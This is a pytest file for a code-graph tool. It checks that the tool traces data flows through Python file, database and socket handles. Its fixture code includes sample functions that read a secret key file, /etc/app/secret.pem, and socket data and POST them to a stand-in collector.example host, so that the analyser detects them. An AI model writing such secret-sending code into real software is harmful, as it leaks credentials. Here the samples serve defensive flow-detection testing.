# Issue #2751: Python I/O through a resource handle starts and ends flows.
# `with open(p) as f: data = f.read()`, `f.write(token)` and
# `conn.execute(...).fetchall()` got READS_FROM / WRITES_TO edges from the I/O
# walk, but the flow walk had no handle model, so no FLOWS_TO joined them.
from __future__ import annotations

from pathlib import Path
from unittest.mock import MagicMock

import pytest

from codebase_rag import constants as cs
from codebase_rag.capture import resolve_capture
from codebase_rag.graph_updater import GraphUpdater
from codebase_rag.parser_loader import load_parsers

_CAPTURE_IO = resolve_capture([cs.CaptureGroup.IO.value])
FLOWS_TO = cs.RelationshipType.FLOWS_TO.value
STDOUT = "resource::STDOUT::<dynamic>"

APP = """import os
import socket
import sqlite3

import requests


def upload_secret():
    with open("/etc/app/secret.pem") as f:
        data = f.read()
    requests.post("https://collector.example/upload", data=data)


def save_token():
    token = os.getenv("API_TOKEN")
    with open("/tmp/token.txt", "w") as f:
        f.write(token)


def dump_users():
    conn = sqlite3.connect("/var/app.db")
    rows = conn.execute("SELECT email FROM users").fetchall()
    print(rows)


def without_with():
    f = open("/etc/plain.txt")
    data = f.read()
    print(data)


def inline_read():
    data = open("/etc/inline.txt").read()
    print(data)


def via_cursor():
    conn = sqlite3.connect("/var/cur.db")
    cur = conn.cursor()
    cur.execute("SELECT name FROM t")
    rows = cur.fetchall()
    print(rows)


def from_socket():
    s = socket.socket()
    msg = s.recv(1024)
    requests.post("https://collector.example/sock", data=msg)


class Saver:
    def __init__(self):
        self.out = open("/tmp/self.txt", "w")

    def save(self):
        self.out.write(os.getenv("SELF_TOKEN"))


def show_token():
    token = os.getenv("SHOW_TOKEN")
    print(token)


def unused_read():
    with open("/etc/unused.txt") as f:
        data = f.read()
    return len("x")


def clean_write():
    with open("/tmp/clean.txt", "w") as f:
        f.write("constant")


def not_a_handle(buf):
    data = buf.read()
    print(data)


def rebound(make):
    f = open("/etc/rebound.txt")
    f = make()
    data = f.read()
    print(data)


def write_verb():
    conn = sqlite3.connect("/var/w.db")
    res = conn.execute("DELETE FROM t")
    print(res)
"""


# Bot review on PR #2770: a handle read on the right of its own rebinding,
# a handle bound on either branch, a `with ... as` alias over a bound name,
# and an enclosing scope's later rebinding of the name.
REVIEW = """import contextlib
import io
import os
import sqlite3

cfg = open("/tmp/cfg.txt", "w")
if os.getenv("QUIET"):
    cfg = None

log = open("/tmp/log.txt", "w")
log = None

out = open("/tmp/out.txt", "w")


def reread():
    rows = sqlite3.connect("/var/reread.db")
    rows = rows.execute("SELECT name FROM t").fetchall()
    print(rows)


def either(flag):
    token = os.getenv("EITHER_TOKEN")
    if flag:
        f = open("/tmp/a.txt", "w")
    else:
        f = open("/tmp/b.txt", "w")
    f.write(token)


def realiased():
    f = open("/tmp/old.txt", "w")
    with contextlib.nullcontext(io.StringIO()) as f:
        f.write(os.getenv("ALIAS_TOKEN"))


def emit_log():
    log.write(os.getenv("LOG_TOKEN"))


def emit_cfg():
    cfg.write(os.getenv("CFG_TOKEN"))


def outer(buffer):
    out = buffer

    def inner():
        out.write(os.getenv("INNER_TOKEN"))

    inner()


class Closer:
    def __init__(self):
        self.f = open("/tmp/closer.txt", "w")

    def save(self):
        self.f.write(os.getenv("CLOSER_TOKEN"))

    def close(self):
        self.f.close()
        self.f = None


class Swapper:
    def __init__(self):
        self.f = open("/tmp/first.txt", "w")
        self.f = open("/tmp/second.txt", "w")

    def save(self):
        self.f.write(os.getenv("SWAP_TOKEN"))
"""


def _flows(root: Path, source: str) -> set[tuple[str, str]]:
    (root / "app.py").write_text(source, encoding="utf-8")
    parsers, queries = load_parsers()
    mock = MagicMock()
    GraphUpdater(
        ingestor=mock,
        repo_path=root,
        parsers=parsers,
        queries=queries,
        capture=_CAPTURE_IO,
    ).run()
    return {
        (str(c.args[0][2]), str(c.args[2][2]))
        for c in mock.ensure_relationship_batch.call_args_list
        if str(c.args[1]) == FLOWS_TO
    }


@pytest.fixture(scope="module")
def flows(tmp_path_factory: pytest.TempPathFactory) -> set[tuple[str, str]]:
    return _flows(tmp_path_factory.mktemp("pyhandles"), APP)


@pytest.fixture(scope="module")
def review_flows(tmp_path_factory: pytest.TempPathFactory) -> set[tuple[str, str]]:
    return _flows(tmp_path_factory.mktemp("pyhandlesreview"), REVIEW)


@pytest.mark.parametrize(
    ("source", "sink"),
    [
        (
            "resource::FILE::/etc/app/secret.pem",
            "resource::NETWORK::https://collector.example/upload",
        ),
        ("resource::ENV::API_TOKEN", "resource::FILE::/tmp/token.txt"),
        ("resource::DATABASE::/var/app.db", STDOUT),
        ("resource::FILE::/etc/plain.txt", STDOUT),
        ("resource::FILE::/etc/inline.txt", STDOUT),
        ("resource::DATABASE::/var/cur.db", STDOUT),
        (
            "resource::SOCKET::<dynamic>",
            "resource::NETWORK::https://collector.example/sock",
        ),
        ("resource::ENV::SELF_TOKEN", "resource::FILE::/tmp/self.txt"),
    ],
)
def test_a_handle_read_or_write_is_a_flow_end(
    flows: set[tuple[str, str]], source: str, sink: str
) -> None:
    assert (source, sink) in flows


@pytest.mark.parametrize(
    ("source", "sink"),
    [
        ("resource::DATABASE::/var/reread.db", STDOUT),
        ("resource::ENV::EITHER_TOKEN", "resource::FILE::/tmp/a.txt"),
        ("resource::ENV::EITHER_TOKEN", "resource::FILE::/tmp/b.txt"),
    ],
    ids=["read-on-the-right-of-its-rebinding", "if-branch", "else-branch"],
)
def test_a_handle_the_path_may_hold_is_a_flow_end(
    review_flows: set[tuple[str, str]], source: str, sink: str
) -> None:
    assert (source, sink) in review_flows


@pytest.mark.parametrize(
    ("source", "sink"),
    [
        ("resource::ENV::ALIAS_TOKEN", "resource::FILE::/tmp/old.txt"),
        ("resource::ENV::LOG_TOKEN", "resource::FILE::/tmp/log.txt"),
        ("resource::ENV::INNER_TOKEN", "resource::FILE::/tmp/out.txt"),
    ],
    ids=["with-alias", "later-module-rebinding", "nearer-scope-rebinding"],
)
def test_a_handle_the_name_no_longer_holds_is_no_flow_end(
    review_flows: set[tuple[str, str]], source: str, sink: str
) -> None:
    assert (source, sink) not in review_flows


# Negative: what must not change.


def test_a_direct_registry_flow_still_flows(flows: set[tuple[str, str]]) -> None:
    assert ("resource::ENV::SHOW_TOKEN", STDOUT) in flows


@pytest.mark.parametrize(
    "resource",
    [
        "resource::FILE::/etc/unused.txt",
        "resource::FILE::/etc/rebound.txt",
        "resource::DATABASE::/var/w.db",
    ],
)
def test_a_handle_value_that_reaches_no_sink_starts_no_flow(
    flows: set[tuple[str, str]], resource: str
) -> None:
    assert not [pair for pair in flows if pair[0] == resource]


def test_a_clean_write_through_a_handle_ends_no_flow(
    flows: set[tuple[str, str]],
) -> None:
    assert not [pair for pair in flows if pair[1] == "resource::FILE::/tmp/clean.txt"]


def test_a_read_on_a_value_that_is_not_a_handle_is_no_source(
    flows: set[tuple[str, str]],
) -> None:
    sources = {source for source, _sink in flows}

    assert sources <= {
        "resource::FILE::/etc/app/secret.pem",
        "resource::ENV::API_TOKEN",
        "resource::DATABASE::/var/app.db",
        "resource::FILE::/etc/plain.txt",
        "resource::FILE::/etc/inline.txt",
        "resource::DATABASE::/var/cur.db",
        "resource::SOCKET::<dynamic>",
        "resource::ENV::SELF_TOKEN",
        "resource::ENV::SHOW_TOKEN",
    } | {source for source, _sink in flows if not source.startswith("resource::")}


@pytest.mark.parametrize(
    ("source", "sink"),
    [
        ("resource::ENV::CFG_TOKEN", "resource::FILE::/tmp/cfg.txt"),
        ("resource::ENV::CLOSER_TOKEN", "resource::FILE::/tmp/closer.txt"),
        ("resource::ENV::SWAP_TOKEN", "resource::FILE::/tmp/second.txt"),
    ],
    ids=[
        "a-conditional-rebinding-keeps-the-handle",
        "a-reset-in-another-method-keeps-the-handle",
        "the-later-self-binding-wins",
    ],
)
def test_a_handle_the_name_may_still_hold_stays_a_flow_end(
    review_flows: set[tuple[str, str]], source: str, sink: str
) -> None:
    assert (source, sink) in review_flows


def test_an_earlier_self_binding_is_replaced(
    review_flows: set[tuple[str, str]],
) -> None:
    assert (
        "resource::ENV::SWAP_TOKEN",
        "resource::FILE::/tmp/first.txt",
    ) not in review_flows
